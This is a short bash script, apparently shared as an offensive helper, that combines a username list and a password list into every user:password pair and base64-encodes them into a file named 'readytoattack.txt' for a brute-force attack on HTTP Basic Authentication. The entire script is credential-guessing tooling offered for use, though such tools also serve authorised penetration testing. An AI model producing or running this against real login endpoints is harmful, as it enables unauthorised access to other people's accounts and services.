#! /usr/bin/bash

# Generate base64 payloads for BasicAuth attack :)
# usage: bash basicauth.sh -u ul.txt -p pw.txt
# final output: readytoattack.txt
# Author: snoopy
while getopts 'u:p:' flag; do
  case "${flag}" in
    u) user_list="${OPTARG}";;
    p) password_lists="${OPTARG}";;
  esac
done

while IFS= read -r line0
do 

    sed "s/$/:$line0/"  "$user_list" >> sstemp.txt
    
done < "$password_lists"

while IFS= read -r line1
do

    echo "$line1" | base64 >> readytoattack.txt

done < sstemp.txt
rm sstemp.txt
